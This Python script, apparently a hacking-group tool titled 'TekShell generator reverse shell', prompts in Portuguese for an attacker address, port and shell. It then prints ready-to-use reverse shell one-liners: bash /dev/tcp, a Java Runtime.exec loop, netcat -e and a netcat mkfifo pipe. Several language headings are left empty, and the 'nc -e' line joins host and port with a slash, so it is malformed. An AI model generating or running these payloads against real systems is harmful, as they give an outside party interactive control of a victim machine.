import os
from colorama import init, Fore, Back, Style
init(autoreset=True)

os.system('cls|clear')
print("""
            \033[94m [ \033[0m \033[1;37;41mTekShell generator reverse shell \033[0m \033[94m ] \033[0m
            
\033[1;49;35m████████╗███████╗██╗  ██╗\033[4;49;96m███████╗██╗  ██╗███████╗██╗     ██╗\033[0m
\033[1;49;35m╚══██╔══╝██╔════╝██║ ██╔╝\033[4;49;96m██╔════╝██║  ██║██╔════╝██║     ██║\033[0m
\033[1;49;35m   ██║   █████╗  █████╔╝ \033[4;49;96m███████╗███████║█████╗  ██║     ██║\033[0m
\033[1;49;35m   ██║   ██╔══╝  ██╔═██╗ \033[4;49;96m╚════██║██╔══██║██╔══╝  ██║     ██║\033[0m
\033[1;49;35m   ██║   ███████╗██║  ██╗\033[4;49;96m███████║██║  ██║███████╗███████╗███████╗\033[0m
\033[1;49;35m   ╚═╝   ╚══════╝╚═╝  ╚═╝\033[4;49;96m╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝\033[0m

            \033[1;37;41mCodded By: CharseSec\033[0m - \033[1;37;41mLybeSec Group\033[0m""")

ext = input("\033[1;37;41mQUAL ENDERECO? >>\033[0m")
port = input("\033[1;37;41mDIGITE A PORTA >>\033[0m")

print("\033[97m╔══════════════════════════════════════════════╗")
print("")
print(""" \033[1;49;35m[ x ] \033[4;49;96m/bin/sh\033[0m

 \033[1;49;35m[ x ] \033[4;49;96m/bin/bash\033[0m

 \033[1;49;35m[ x ] \033[4;49;96m/bin/zsh\033[0m

 \033[1;49;35m[ x ] \033[4;49;96m/bin/ksh\033[0m

 \033[1;49;35m[ x ] \033[4;49;96m/bin/tcsh\033[0m

 \033[1;49;35m[ x ] \033[4;49;96m/bin/dash\033[0m""")
print("")
print("\033[97m╚══════════════════════════════════════════════╝ ")

shell = input("\033[1;37;41mDIGITE A SHELL COMO OS EXEMPLOS ACIMA >>\033[0m")

print("\033[97m╔══════════════════════════════════════════════╗")
print("")
print(f""" \033[1;49;35m[ + ] \033[4;49;96mBASH\033[0m
bash -i >& /dev/tcp/{ext}/{port} 0>&1

 \033[1;49;35m[ + ] \033[4;49;96mJAVA\033[0m
r = Runtime.getRuntime()
p = r.exec(["{shell}","-c","exec 5<>/dev/tcp/{ext}/{port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

 \033[1;49;35m[ + ] \033[4;49;96mPERL\033[0m

 \033[1;49;35m[ + ] \033[4;49;96mPYTHON\033[0m

 \033[1;49;35m[ + ] \033[4;49;96mPHP\033[0m

 \033[1;49;35m[ + ] \033[4;49;96mNC-PLAIN\033[0m
nc -e {shell} {ext}/{port}

 \033[1;49;35m[ + ] \033[4;49;96mNC-MKFIFO\033[0m
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ext} {port} >/tmp/f

 \033[1;49;35m[ + ] \033[4;49;96mRUBY\033[0m

 \033[1;49;35m[ + ] \033[4;49;96mTELNET\033[0m

 \033[1;49;35m[ + ] \033[4;49;96mWIN-POWERSHELL\033[0m""")
print("")
print("\033[97m╔══════════════════════════════════════════════╗")

  
